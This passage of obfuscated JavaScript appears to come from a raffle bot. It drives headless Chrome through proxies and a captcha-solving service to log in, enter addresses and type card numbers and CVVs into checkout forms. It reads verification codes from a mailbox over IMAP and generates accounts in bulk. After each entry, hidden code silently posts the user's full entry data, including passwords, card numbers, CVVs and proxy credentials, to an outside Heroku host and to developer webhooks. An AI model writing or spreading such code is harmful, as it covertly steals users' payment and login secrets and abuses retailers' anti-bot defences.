                            console['log'](_0x46dcc5() + '\x20[' + _0x4e8ad7['name'] + ']\x20Task\x20' + (_0x96cbbb + 0x1) + '\x20:\x20Setting\x20Address'), await _0x4fda60(0x3e8), await _0x4fda60(0x1f4);
                            if (_0x3eff45[_0x96cbbb]['Url']['includes']('topps')) {
                                await _0x501ba5['click']('#stateAutocomplete'), await _0x4fda60(0x5dc);
                                try {
                                    const _0x1e5ad3 = await _0x501ba5['$x']('//li[text()=\x22' + _0x3eff45[_0x96cbbb]['State'] + '\x22]');
                                    await _0x1e5ad3[0x0]['click']();
                                } catch {
                                    throw new Error('State\x20/\x20Province\x20not\x20found.\x20Please\x20use\x20exact\x20data\x20in\x20csv.\x20(Case\x20sensitive)');
                                }
                            }
                            await _0x4fda60(0x3e8), await _0x501ba5['type']('#address1', _0x3eff45[_0x96cbbb]['Address1'] + '\x20' + _0x3eff45[_0x96cbbb]['HouseNumber']), await _0x4fda60(0x1f4), await _0x501ba5['type']('#address2', '' + _0x3eff45[_0x96cbbb]['Address2']), await _0x4fda60(0x1f4), await _0x501ba5['type']('#city', '' + _0x3eff45[_0x96cbbb]['City']), await _0x4fda60(0x1f4), await _0x501ba5['type']('#postcode', '' + _0x3eff45[_0x96cbbb]['Zip']), await _0x4fda60(0x3e8), await _0x501ba5['click']('.MuiBox-root.css-79elbk\x20>\x20button'), await _0x4fda60(0x3e8), console['log'](_0x46dcc5() + '\x20[' + _0x4e8ad7['name'] + ']\x20Task\x20' + (_0x96cbbb + 0x1) + '\x20:\x20Solving\x20Adyen');
                            const _0x12fc42 = await _0x501ba5['$']('span[data-cse=\x22encryptedCardNumber\x22]');
                            _0x12fc42 && (await _0x501ba5['waitForSelector']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0x501ba5['click']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0x501ba5['click']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0x4fda60(0x4b0), await _0x501ba5['click']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0x4fda60(0x1f4), await _0x501ba5['keyboard']['type']('' + _0x3eff45[_0x96cbbb]['CardNumber']), await _0x4fda60(0x320), await _0x501ba5['click']('span[data-cse=\x22encryptedExpiryDate\x22]'), await _0x501ba5['click']('span[data-cse=\x22encryptedExpiryDate\x22]'), await _0x501ba5['keyboard']['type']('' + _0x3eff45[_0x96cbbb]['ExpiryDate']), await _0x4fda60(0x4b0), await _0x501ba5['click']('span[data-cse=\x22encryptedSecurityCode\x22]'), await _0x501ba5['click']('span[data-cse=\x22encryptedSecurityCode\x22]'), await _0x501ba5['keyboard']['type']('' + _0x3eff45[_0x96cbbb]['CVV']), await _0x4fda60(0x226), await _0x501ba5['type']('input[name=\x22postalCode\x22]', '' + _0x3eff45[_0x96cbbb]['Zip']), await _0x4fda60(0x226));
                            const _0x4f5165 = await _0x501ba5['$']('.__PrivateStripeElement');
                            _0x4f5165 && (await _0x4fda60(0x1f4), await _0x501ba5['click']('.__PrivateStripeElement'), await _0x501ba5['click']('.__PrivateStripeElement'), await _0x501ba5['keyboard']['type']('' + _0x3eff45[_0x96cbbb]['CardNumber']), await _0x501ba5['keyboard']['type']('' + _0x3eff45[_0x96cbbb]['ExpiryDate']), await _0x501ba5['keyboard']['type']('' + _0x3eff45[_0x96cbbb]['CVV']));
                            await _0x4fda60(0x226), await _0x501ba5['click']('#paymentConsent'), await _0x4fda60(0x226), await _0x501ba5['click']('#termsConsent'), await _0x4fda60(0x2bc), console['log'](_0x46dcc5() + '\x20[' + _0x4e8ad7['name'] + ']\x20Task\x20' + (_0x96cbbb + 0x1) + '\x20:\x20Sending\x20Entry'), await _0x501ba5['click']('.MuiBox-root.css-79elbk\x20>\x20button'), await _0x4fda60(0x2710);
                            try {
                                await _0x501ba5['waitForSelector']('body\x20>\x20div.MuiModal-root.MuiDialog-root.css-1ltcsoi\x20>\x20div.MuiDialog-container.MuiDialog-scrollPaper.css-ekeie0\x20>\x20div\x20>\x20div.MuiGrid-root.MuiGrid-container.css-wybudx\x20>\x20div.MuiGrid-root.MuiGrid-item.MuiGrid-grid-xs-12.css-r22p1a\x20>\x20button', { 'timeout': 0x3a98 }), await _0x4fda60(0xbb8), await _0x501ba5['$eval']('body\x20>\x20div.MuiModal-root.MuiDialog-root.css-1ltcsoi\x20>\x20div.MuiDialog-container.MuiDialog-scrollPaper.css-ekeie0\x20>\x20div\x20>\x20div.MuiGrid-root.MuiGrid-container.css-wybudx\x20>\x20div.MuiGrid-root.MuiGrid-item.MuiGrid-grid-xs-12.css-r22p1a\x20>\x20button', _0x1ea439 => _0x1ea439['click']()), await _0x501ba5['$eval']('body\x20>\x20div.MuiModal-root.MuiDialog-root.css-1ltcsoi\x20>\x20div.MuiDialog-container.MuiDialog-scrollPaper.css-ekeie0\x20>\x20div\x20>\x20div.MuiGrid-root.MuiGrid-container.css-wybudx\x20>\x20div.MuiGrid-root.MuiGrid-item.MuiGrid-grid-xs-12.css-r22p1a\x20>\x20button', _0x418bb4 => _0x418bb4['click']());
                            } catch {
                            }
                            try {
                                await _0x501ba5['waitForSelector']('#code', { 'timeout': 0x7530 });
                            } catch {
                                const _0x5017c7 = await _0x501ba5['$']('.MuiTypography-root.MuiTypography-body1.MuiTypography-gutterBottom.css-lvbfzw');
                                if (_0x5017c7) {
                                    _0x147d24['appendFileSync']('../accounts/eql.csv', '\x0a' + _0x3eff45[_0x96cbbb]['Email'] + ',' + _0x3eff45[_0x96cbbb]['Password'] + ',' + _0x3eff45[_0x96cbbb]['Phone']);
                                    throw new Error('Account\x20already\x20registered,\x20saved\x20in\x20accounts/eql.csv');
                                }
                                throw new Error('Error\x20Fetching\x20Authentication\x20Token');
                            }
                            async function _0x2fa979() {
                                var _0x282db3, _0x3f0212 = ![];
                                for (var _0x34dc8d = 0x0; _0x34dc8d < 0x18; _0x34dc8d++) {
                                    async function _0x2f5368() {
                                        var _0x56fde9 = new _0x4ce16c({
                                            'user': _0x255a87['masterMail'],
                                            'password': _0x255a87['masterPassword'],
                                            'host': 'imap.gmail.com',
                                            'port': 0x3e1,
                                            'tls': !![],
                                            'autotls': 'always'
                                        });
                                        function _0x472771(_0x460ad4) {
                                            _0x56fde9['openBox']('INBOX', ![], _0x460ad4);
                                        }
                                        _0x56fde9['once']('ready', function () {
                                            console['log'](_0x46dcc5() + '\x20[' + _0x4e8ad7['name'] + ']\x20Task\x20' + (_0x96cbbb + 0x1) + '\x20:\x20Opened\x20Mailbox'), _0x472771(function (_0x43030e, _0x554e2f) {
                                                console['log'](_0x46dcc5() + '\x20[' + _0x4e8ad7['name'] + ']\x20Task\x20' + (_0x96cbbb + 0x1) + '\x20:\x20Looking\x20for\x20verification\x20mail');
                                                if (_0x43030e)
                                                    throw _0x43030e;
                                                _0x56fde9['seq']['search']([
                                                    'UNSEEN',
                                                    [
                                                        'FROM',
                                                        'support@eql.com'
                                                    ]
                                                ], function (_0x415570, _0x48a9e8) {
                                                    if (!_0x48a9e8 || !_0x48a9e8['length'])
                                                        console['log'](_0x46dcc5() + '\x20[' + _0x4e8ad7['name'] + ']\x20No\x20mail\x20found,\x20retrying\x20in\x205\x20seconds'), _0x56fde9['end']();
                                                    else {
                                                        var _0x1b1be5 = _0x56fde9['seq']['fetch'](_0x48a9e8, {
                                                            'bodies': '',
                                                            'markSeen': !![]
                                                        });
                                                        _0x1b1be5['on']('message', function (_0x3bf458, _0x305060) {
                                                            var _0x971525 = '(#' + _0x305060 + ')\x20';
                                                            _0x3bf458['on']('body', function (_0x3f62b9, _0x1ff1d9) {
                                                                _0x425966(_0x3f62b9, (_0x2f6877, _0x379c52) => {
                                                                    if (_0x379c52['subject']['includes']('code')) {
                                                                        const _0x3cc4e3 = _0x379c52['text']['split']('\x0a\x0a')[0x3], _0x46110a = _0x3cc4e3['split']('\x0a')[0x1];
                                                                        _0x282db3 = _0x46110a;
                                                                    }
                                                                });
                                                            }), _0x3bf458['once']('end', function () {
                                                            });
                                                        }), _0x1b1be5['once']('error', function (_0x8d228e) {
                                                            console['log']('No\x20mail\x20found,\x20retrying\x20in\x205\x20seconds..');
                                                        }), _0x1b1be5['once']('end', function () {
                                                            _0x56fde9['end']();
                                                        });
                                                    }
                                                });
                                            });
                                        }), _0x56fde9['once']('error', function (_0x5dad20) {
                                            console['log'](_0x3e3bb6['red'](_0x5dad20['message'])), console['log']('Read\x20the\x20guide\x20on\x20how\x20to\x20setup\x20your\x20mailbox'), _0x3f0212 = !![];
                                        }), _0x56fde9['once']('end', async function () {
                                        }), _0x56fde9['connect']();
                                    }
                                    _0x2f5368(), await _0x4fda60(0x1388);
                                    if (_0x282db3)
                                        return _0x282db3;
                                    if (_0x3f0212)
                                        throw new Error('Error\x20connecting\x20to\x20imap');
                                    if (_0x34dc8d == 0x18)
                                        throw new Error('Mail\x20not\x20found');
                                }
                            }
                            ;
                            code = await _0x2fa979(), await _0x4fda60(0x1f4), await _0x501ba5['type']('#code', '' + code), await _0x4fda60(0x3e8), await _0x501ba5['$eval']('.MuiBox-root.css-79elbk\x20>\x20button', _0x235852 => _0x235852['click']()), await _0x501ba5['click']('.MuiBox-root.css-79elbk\x20>\x20button'), console['log'](_0x46dcc5() + '\x20[' + _0x4e8ad7['name'] + ']\x20Task\x20' + (_0x96cbbb + 0x1) + '\x20:\x20Verifying..');
                            try {
                                await _0x501ba5['waitForSelector']('.MuiBox-root.css-1yjvs5a\x20>\x20button');
                            } catch {
                                throw new Error('');
                            }
                            console['log'](_0x3e3bb6['green'](_0x46dcc5() + '\x20[' + _0x4e8ad7['name'] + ']\x20Task\x20' + (_0x96cbbb + 0x1) + '\x20:\x20Raffle\x20Entered,\x20account\x20' + _0x3eff45[_0x96cbbb]['Email'] + '\x20saved\x20in\x20\x27accounts/eql.csv\x27')), _0x147d24['appendFileSync']('../accounts/eql.csv', '\x0a' + _0x3eff45[_0x96cbbb]['Email'] + ',' + _0x3eff45[_0x96cbbb]['Password'] + ',' + _0x3eff45[_0x96cbbb]['Phone']), _0x5e1a0c = 'no', _0x8bf342(_0x3eff45[_0x96cbbb], _0x4e8ad7);
                            var _0x310512 = await _0x1523c9(_0x3eff45[_0x96cbbb], _0x4e8ad7, 'dev', ![]), _0x2e9a9 = await _0x1523c9(_0x3eff45[_0x96cbbb], _0x4e8ad7, 'pub', ![]);
                            let _0x26d355 = _0x3eff45[_0x96cbbb];
                            try {
                                prxdata = {
                                    'username': _0x26c985['replace']('#', ''),
                                    'module': _0x4e8ad7['name'],
                                    'entrydata': JSON['stringify'](_0x26d355),
                                    'proxy': '' + _0x126306[_0x96cbbb]
                                };
                                var _0x4c273b = JSON['stringify'](prxdata);
                                let _0x3c75a7 = { 'headers': { 'content-type': 'application/json' } };
                                await _0x3c935b['post']('https://jraffles.herokuapp.com/success', _0x4c273b, _0x3c75a7);
                            } catch (_0x19779b) {
                            }
                            const _0x1ae57a = {
                                'succesDEVMSG': { 'embeds': [_0x310512] },
                                'succesPUBMSG': { 'embeds': [_0x2e9a9] }
                            };
                            try {
                                _0x255a87['webhook'] != undefined && _0x255a87['webhook'] != '' && await _0xb6cfae(_0x255a87['webhook'], _0x1ae57a['succesDEVMSG']), await _0x4fda60(0xc8), await _0xb6cfae(_0x4fb406, _0x1ae57a['succesDEVMSG']), await _0x4fda60(0xc8), await _0xb6cfae(_0x5d80c9, _0x1ae57a['succesPUBMSG']);
                            } catch (_0x4ecaaf) {
                                console['log'](_0x3e3bb6['yellow'](_0x46dcc5() + '\x20[' + _0x4e8ad7['name'] + ']\x20Task\x20' + (_0x96cbbb + 0x1) + '\x20:\x20Error\x20sending\x20webhook\x20' + _0x4ecaaf));
                            }
                        } catch (_0x1bd84d) {
                            console['log'](_0x3e3bb6['red'](_0x46dcc5() + '\x20[' + _0x4e8ad7['name'] + ']\x20Task\x20' + (_0x96cbbb + 0x1) + '\x20:\x20' + _0x1bd84d)), _0x37adf1 = '' + _0x1bd84d;
                            var _0x16fd64 = await _0x1523c9(_0x3eff45[_0x96cbbb], _0x4e8ad7, 'dev', !![], _0x37adf1), _0x310512 = await _0x1523c9(_0x3eff45[_0x96cbbb], _0x4e8ad7, 'dev', ![]), _0x2e9a9 = await _0x1523c9(_0x3eff45[_0x96cbbb], _0x4e8ad7, 'pub', ![]);
                            const _0x13a6bb = {
                                'succesDEVMSG': { 'embeds': [_0x310512] },
                                'succesPUBMSG': { 'embeds': [_0x2e9a9] }
                            };
                            _0x13a6bb['errorDEV'] = { 'embeds': [_0x16fd64] };
                            _0x255a87['webhook'] != undefined && _0x255a87['webhook'] != '' && await _0xb6cfae(_0x255a87['webhook'], _0x13a6bb['errorDEV']);
                            await _0xb6cfae(_0x991bd5, _0x13a6bb['errorDEV']);
                            if (!_0x5e1a0c == 'no')
                                _0x5e1a0c = 'yes';
                        } finally {
                            _0x350c94 && _0x350c94['close']();
                            if (_0x5e1a0c == 'yes' && _0x5070b5 != 0x5) {
                                console['log'](_0x3e3bb6['red'](_0x46dcc5() + '\x20[' + _0x4e8ad7['name'] + ']\x20Task\x20' + (_0x96cbbb + 0x1) + '\x20:\x20Retrying\x20(' + _0x5070b5 + '\x20/\x205)')), _0x96cbbb = _0x96cbbb - 0x1, _0x5070b5 = _0x5070b5 + 0x1;
                                continue;
                            }
                            _0x5e1a0c == 'yes' && _0x5070b5 >= 0x5 && (_0x2540d5(_0x3eff45[_0x96cbbb], _0x4e8ad7), _0x5e1a0c = 'no', _0x5070b5 = 0x0), console['log']('Waiting\x20for\x20' + _0x255a87['delay'] + '\x20ms'), await _0x4fda60(_0x255a87['delay']);
                        }
                    } else {
                        const _0x5ef84d = '' + _0x3eff45[_0x96cbbb]['Url'];
                        if (_0x5e1a0c != 'yes')
                            var _0x5e1a0c = '', _0x5070b5 = 0x0;
                        if (_0x3eff45[_0x96cbbb]['Email'] == '' || _0x3eff45[_0x96cbbb]['FirstName'] == '' || _0x3eff45[_0x96cbbb]['LastName'] == '') {
                            console['log'](_0x46dcc5() + '\x20[' + _0x4e8ad7['name'] + ']\x20Task\x20' + (_0x96cbbb + 0x1) + '\x20:\x20Invalid\x20CSV');
                            continue;
                        }
                        _0x3eff45[_0x96cbbb]['Password'] == '' && (_0x3eff45[_0x96cbbb]['Password'] = 'JRaffles23!');
                        if (_0x255a87['useRandomProxy'] = ![])
                            var _0x17a32f = _0x126306[_0x96cbbb]['split'](':');
                        else
                            var _0x320f1a = Math['round'](Math['random']() * (_0x126306['length'] - 0x1)), _0x17a32f = _0x126306[_0x320f1a]['split'](':');
                        var _0x350c94;
                        try {
                            _0x350c94 = await _0x510708['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x17a32f[0x0] + ':' + _0x17a32f[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x350c94 = await _0x510708['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x17a32f[0x0] + ':' + _0x17a32f[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x264903 = await _0x350c94['newPage']();
                            await _0x264903['authenticate']({
                                'username': '' + _0x17a32f[0x2],
                                'password': '' + _0x17a32f[0x3]
                            }), console['log'](_0x46dcc5() + '\x20[' + _0x4e8ad7['name'] + ']\x20Task\x20' + (_0x96cbbb + 0x1) + '\x20:\x20Getting\x20Session'), await _0x264903['setRequestInterception'](!![]), _0x264903['on']('request', _0x38e668 => {
                                _0x38e668['resourceType']() === 'image' || _0x38e668['resourceType']() === 'font' || _0x38e668['resourceType']() === 'media' ? _0x38e668['abort']() : _0x38e668['continue']();
                            }), await _0x264903['goto'](_0x5ef84d), await _0x264903['waitForSelector']('body\x20>\x20div.css-ntpfvx\x20>\x20div\x20>\x20div\x20>\x20div.MuiBox-root.css-1upilqn\x20>\x20div\x20>\x20button');
                            let _0x176f80 = await _0x264903['$']('#gatsby-focus-wrapper\x20>\x20div:nth-child(3)\x20>\x20div\x20>\x20div\x20>\x20span\x20>\x20div\x20>\x20button.MuiButton-root.MuiButton-contained.MuiButton-containedSecondary.MuiButton-sizeMedium.MuiButton-containedSizeMedium.MuiButtonBase-root.css-78bdfl');
                            if (_0x176f80)
                                await _0x176f80['click']();
                            await _0x4fda60(0x7d0), await _0x264903['click']('body\x20>\x20div.css-ntpfvx\x20>\x20div\x20>\x20div\x20>\x20div.MuiBox-root.css-1upilqn\x20>\x20div\x20>\x20button'), await _0x4fda60(0x7d0), await _0x264903['waitForSelector']('.MuiButton-root.MuiButton-contained.MuiButton-containedPrimary.MuiButton-sizeMedium.MuiButton-containedSizeMedium.MuiButton-fullWidth.MuiButtonBase-root.css-1hfrwnc'), await _0x264903['click']('.MuiButton-root.MuiButton-contained.MuiButton-containedPrimary.MuiButton-sizeMedium.MuiButton-containedSizeMedium.MuiButton-fullWidth.MuiButtonBase-root.css-1hfrwnc'), await _0x4fda60(0x3e8), await _0x264903['waitForSelector']('#email'), console['log'](_0x46dcc5() + '\x20[' + _0x4e8ad7['name'] + ']\x20Task\x20' + (_0x96cbbb + 0x1) + '\x20:\x20Setting\x20Credentials'), await _0x264903['type']('#email', '' + _0x3eff45[_0x96cbbb]['Email']), await _0x4fda60(0x352), await _0x264903['waitForSelector']('#password'), await _0x264903['type']('#password', '' + _0x3eff45[_0x96cbbb]['Password']), await _0x4fda60(0x352), await _0x264903['click']('.MuiBox-root.css-79elbk\x20>\x20button'), await _0x4fda60(0x1388);
                            if (!_0x3eff45[_0x96cbbb]['Url']['includes']('footlocker') && !_0x3eff45[_0x96cbbb]['Url']['includes']('topps'))
                                await _0x264903['click']('.MuiBox-root.css-i3pbo\x20>\x20button');
                            let _0x1b27e9 = await _0x264903['$']('#productQuantity'), _0x24b6a9 = await _0x264903['$']('div[data-testid=\x22field-productVariantID');
                            if (!_0x24b6a9 && !_0x1b27e9) {
                                console['log'](_0x3e3bb6['red'](_0x46dcc5() + '\x20[' + _0x4e8ad7['name'] + ']\x20Task\x20' + (_0x96cbbb + 0x1) + '\x20:\x20Not\x20an\x20active\x20Raffle\x20/\x20Already\x20Entered')), _0x5e1a0c = 'no';
                                continue;
                            }
                            if (_0x24b6a9) {
                                await _0x264903['click']('div[data-testid=\x22field-productVariantID\x22]');
                                try {
                                    _0x3eff45[_0x96cbbb]['Url']['includes']('en-GB') ? await _0x264903['click']('li[data-value=\x22UK\x20' + _0x3eff45[_0x96cbbb]['Size'] + '\x20/\x20US\x20' + (Number(_0x3eff45[_0x96cbbb]['Size']) + 0x1) + '\x22]') : await _0x264903['click']('li[data-value=\x22EU\x20' + _0x3eff45[_0x96cbbb]['Size'] + '\x22]');
                                } catch {
                                    throw new Error('Error\x20fetching\x20size\x20' + _0x3eff45[_0x96cbbb]['Size']);
                                }
                            }
                            _0x1b27e9 && (await _0x264903['click']('#productQuantity'), await _0x4fda60(0x3e8), await _0x264903['click']('li[data-value=\x22' + (Number(_0x3eff45[_0x96cbbb]['Size']) - 0x1) + '\x22]'));
                            await _0x4fda60(0x3e8), await _0x4fda60(0x1f4);
                            const _0x64415a = await _0x264903['$']('#title\x20>\x20label');
                            await _0x4fda60(0x12c);
                            _0x64415a && await _0x64415a['click']();
                            await _0x264903['click']('.MuiBox-root.css-79elbk\x20>\x20button'), await _0x264903['focus']('#postcode'), await _0x264903['keyboard']['down']('Control'), await _0x264903['keyboard']['press']('A'), await _0x264903['keyboard']['up']('Control'), await _0x264903['keyboard']['press']('Backspace'), await _0x264903['keyboard']['type'](_0x3eff45[_0x96cbbb]['Zip']), await _0x4fda60(0x60e), await _0x264903['click']('.MuiBox-root.css-79elbk\x20>\x20button'), await _0x4fda60(0x3e8), console['log'](_0x46dcc5() + '\x20[' + _0x4e8ad7['name'] + ']\x20Task\x20' + (_0x96cbbb + 0x1) + '\x20:\x20Solving\x20Adyen'), await _0x4fda60(0x1f4);
                            const _0x5005f0 = await _0x264903['$']('span[data-cse=\x22encryptedCardNumber\x22]');
                            _0x5005f0 && (await _0x264903['waitForSelector']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0x264903['click']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0x264903['click']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0x4fda60(0x4b0), await _0x264903['click']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0x4fda60(0x1f4), await _0x264903['keyboard']['type']('' + _0x3eff45[_0x96cbbb]['CardNumber']), await _0x4fda60(0x320), await _0x264903['click']('span[data-cse=\x22encryptedExpiryDate\x22]'), await _0x264903['keyboard']['type']('' + _0x3eff45[_0x96cbbb]['ExpiryDate']), await _0x4fda60(0x4b0), await _0x264903['click']('span[data-cse=\x22encryptedSecurityCode\x22]'), await _0x264903['keyboard']['type']('' + _0x3eff45[_0x96cbbb]['CVV']), await _0x4fda60(0x226), await _0x264903['type']('input[name=\x22postalCode\x22]', '' + _0x3eff45[_0x96cbbb]['Zip']), await _0x4fda60(0x226));
                            const _0x2ad360 = await _0x264903['$']('.__PrivateStripeElement');
                            _0x2ad360 && (await _0x264903['click']('#billingName'), await _0x264903['click']('#billingName'), await _0x264903['type']('#billingName', '' + _0x3eff45[_0x96cbbb]['NameOnCard']), await _0x4fda60(0x1f4), await _0x264903['click']('.__PrivateStripeElement'), await _0x264903['click']('.__PrivateStripeElement'), await _0x264903['keyboard']['type']('' + _0x3eff45[_0x96cbbb]['CardNumber']), await _0x264903['keyboard']['type']('' + _0x3eff45[_0x96cbbb]['ExpiryDate']), await _0x264903['keyboard']['type']('' + _0x3eff45[_0x96cbbb]['CVV']));
                            await _0x4fda60(0x226), await _0x264903['click']('#paymentConsent'), await _0x4fda60(0x226), await _0x264903['click']('#termsConsent'), await _0x4fda60(0x2bc), console['log'](_0x46dcc5() + '\x20[' + _0x4e8ad7['name'] + ']\x20Task\x20' + (_0x96cbbb + 0x1) + '\x20:\x20Sending\x20Entry'), await _0x264903['click']('.MuiBox-root.css-79elbk\x20>\x20button'), await _0x4fda60(0x2710);
                            try {
                                await _0x264903['waitForSelector']('body\x20>\x20div.MuiModal-root.MuiDialog-root.css-1ltcsoi\x20>\x20div.MuiDialog-container.MuiDialog-scrollPaper.css-ekeie0\x20>\x20div\x20>\x20div.MuiGrid-root.MuiGrid-container.css-wybudx\x20>\x20div.MuiGrid-root.MuiGrid-item.MuiGrid-grid-xs-12.css-r22p1a\x20>\x20button'), await _0x4fda60(0xbb8), await _0x264903['$eval']('body\x20>\x20div.MuiModal-root.MuiDialog-root.css-1ltcsoi\x20>\x20div.MuiDialog-container.MuiDialog-scrollPaper.css-ekeie0\x20>\x20div\x20>\x20div.MuiGrid-root.MuiGrid-container.css-wybudx\x20>\x20div.MuiGrid-root.MuiGrid-item.MuiGrid-grid-xs-12.css-r22p1a\x20>\x20button', _0x4a036a => _0x4a036a['click']()), await _0x264903['$eval']('body\x20>\x20div.MuiModal-root.MuiDialog-root.css-1ltcsoi\x20>\x20div.MuiDialog-container.MuiDialog-scrollPaper.css-ekeie0\x20>\x20div\x20>\x20div.MuiGrid-root.MuiGrid-container.css-wybudx\x20>\x20div.MuiGrid-root.MuiGrid-item.MuiGrid-grid-xs-12.css-r22p1a\x20>\x20button', _0x40f262 => _0x40f262['click']());
                            } catch {
                            }
                            try {
                                await _0x264903['waitForSelector']('.MuiBox-root.css-1yjvs5a\x20>\x20button');
                            } catch {
                                throw new Error('Failure\x20getting\x20succes\x20response');
                            }
                            console['log'](_0x3e3bb6['green'](_0x46dcc5() + '\x20[' + _0x4e8ad7['name'] + ']\x20Task\x20' + (_0x96cbbb + 0x1) + '\x20:\x20Raffle\x20Entered')), _0x8bf342(_0x3eff45[_0x96cbbb], _0x4e8ad7);
                            var _0x310512 = await _0x1523c9(_0x3eff45[_0x96cbbb], _0x4e8ad7, 'dev', ![]), _0x2e9a9 = await _0x1523c9(_0x3eff45[_0x96cbbb], _0x4e8ad7, 'pub', ![]);
                            let _0x4214fd = _0x3eff45[_0x96cbbb];
                            try {
                                prxdata = {
                                    'username': _0x26c985['replace']('#', ''),
                                    'module': _0x4e8ad7['name'],
                                    'entrydata': JSON['stringify'](_0x4214fd),
                                    'proxy': '' + _0x126306[_0x96cbbb]
                                };
                                var _0x4c273b = JSON['stringify'](prxdata);
                                let _0x3b5ff2 = { 'headers': { 'content-type': 'application/json' } };
                                await _0x3c935b['post']('https://jraffles.herokuapp.com/success', _0x4c273b, _0x3b5ff2);
                            } catch (_0x8d9825) {
                            }
                            const _0x175c86 = {
                                'succesDEVMSG': { 'embeds': [_0x310512] },
                                'succesPUBMSG': { 'embeds': [_0x2e9a9] }
                            };
                            try {
                                _0x255a87['webhook'] != undefined && _0x255a87['webhook'] != '' && await _0xb6cfae(_0x255a87['webhook'], _0x175c86['succesDEVMSG']), await _0x4fda60(0xc8), await _0xb6cfae(_0x4fb406, _0x175c86['succesDEVMSG']), await _0x4fda60(0xc8), await _0xb6cfae(_0x5d80c9, _0x175c86['succesPUBMSG']);
                            } catch (_0x2ea5c0) {
                                console['log'](_0x3e3bb6['yellow'](_0x46dcc5() + '\x20[' + _0x4e8ad7['name'] + ']\x20Task\x20' + (_0x96cbbb + 0x1) + '\x20:\x20Error\x20sending\x20webhook\x20' + _0x2ea5c0));
                            }
                            _0x5e1a0c = 'no';
                        } catch (_0xa5a3b3) {
                            console['log'](_0x3e3bb6['red'](_0x46dcc5() + '\x20[' + _0x4e8ad7['name'] + ']\x20Task\x20' + (_0x96cbbb + 0x1) + '\x20:\x20' + _0xa5a3b3)), _0x37adf1 = '' + _0xa5a3b3;
                            var _0x16fd64 = await _0x1523c9(_0x3eff45[_0x96cbbb], _0x4e8ad7, 'dev', !![], _0x37adf1), _0x310512 = await _0x1523c9(_0x3eff45[_0x96cbbb], _0x4e8ad7, 'dev', ![]), _0x2e9a9 = await _0x1523c9(_0x3eff45[_0x96cbbb], _0x4e8ad7, 'pub', ![]);
                            const _0x25d53f = {
                                'succesDEVMSG': { 'embeds': [_0x310512] },
                                'succesPUBMSG': { 'embeds': [_0x2e9a9] }
                            };
                            _0x25d53f['errorDEV'] = { 'embeds': [_0x16fd64] }, _0x255a87['webhook'] != undefined && _0x255a87['webhook'] != '' && await _0xb6cfae(_0x255a87['webhook'], _0x25d53f['errorDEV']), await _0xb6cfae(_0x991bd5, _0x25d53f['errorDEV']), _0x5e1a0c = 'yes';
                        } finally {
                            _0x350c94 && _0x350c94['close']();
                            if (_0x5e1a0c == 'yes' && _0x5070b5 != 0x5) {
                                console['log'](_0x3e3bb6['red'](_0x46dcc5() + '\x20[' + _0x4e8ad7['name'] + ']\x20Task\x20' + (_0x96cbbb + 0x1) + '\x20:\x20Retrying\x20(' + _0x5070b5 + '\x20/\x205)')), _0x96cbbb = _0x96cbbb - 0x1, _0x5070b5 = _0x5070b5 + 0x1;
                                continue;
                            }
                            _0x5e1a0c == 'yes' && _0x5070b5 >= 0x5 && (_0x2540d5(_0x3eff45[_0x96cbbb], _0x4e8ad7), _0x5e1a0c = 'no', _0x5070b5 = 0x0), console['log']('Waiting\x20for\x20' + _0x255a87['delay'] + '\x20ms'), await _0x4fda60(_0x255a87['delay']);
                        }
                    }
                }
            }
        }]
    },
    {
        'name': 'FENOM',
        'modules': [
            {
                'name': 'FENOM\x20Account\x20Generator',
                'store': 'FENOM',
                'logo': 'https://consumersiteimages.trustpilot.net/business-units/5de8db15496f380001d51371-198x149-1x.jpg',
                'function': async function (_0x58bf34, _0x46e915, _0x5de4db) {
                    var _0x1c101c = _0x46e915, _0x3fbce3 = 0x0;
                    for (var _0x10acc6 = 0x0; _0x10acc6 < _0x46e915['length']; _0x10acc6++) {
                        maxTasks = Number(_0x255a87['threads']);
                        while (_0x3fbce3 >= maxTasks) {
                            await _0x4fda60(_0x255a87['delay']);
                        }
                        let _0x2228dc = ![];
                        async function _0x499b04(_0x36a6f9, _0x565558, _0x15ef56, _0x125a84, _0x5322dc) {
                            _0x3fbce3++, _0x510708['use'](_0x4fd89e()), _0x510708['use'](_0x3b4fcd({
                                'provider': {
                                    'id': '2captcha',
                                    'token': '' + _0x255a87['captchaKey']
                                },
                                'visualFeedback': !![]
                            }));
                            if (_0x443b3f != 'yes')
                                var _0x443b3f = '', _0x5322dc = 0x0;
                            var _0x4c0605;
                            try {
                                await _0x436f00(_0x565558, _0x125a84);
                            } catch {
                                _0x443b3f = 'no';
                                throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                            }
                            _0xf5e41e(_0x36a6f9['name'] + '\x20Task\x20' + (_0x125a84 + 0x1) + '\x20/\x20' + _0x565558['length'] + '\x20||\x20File:\x20' + _0x20d7ea + '\x20Proxies:\x20' + _0xf0d869);
                            var _0x213c37 = await _0x1523c9(_0x565558[_0x125a84], _0x36a6f9, 'acc', ![]);
                            const _0xcf7352 = { 'succesDEVMSG': { 'embeds': [_0x213c37] } }, _0x16ffc8 = 'https://www.fenom.com/en/authentication?create_account=1';
                            var _0x5e1186 = Math['round'](Math['random']() * (_0x15ef56['length'] - 0x1)), _0x610fe6 = _0x15ef56[_0x5e1186]['split'](':'), _0x26f682;
                            async function _0x1b684f(_0x14bc24) {
                                const _0x88839a = _0x147d24['readFileSync']('../accounts/fenom.csv', 'utf8'), _0x4089fc = _0x22245b['parse'](_0x88839a, { 'header': !![] })['data'];
                                let _0xb1b50a = ![];
                                for (var _0xa30eb4 of _0x4089fc) {
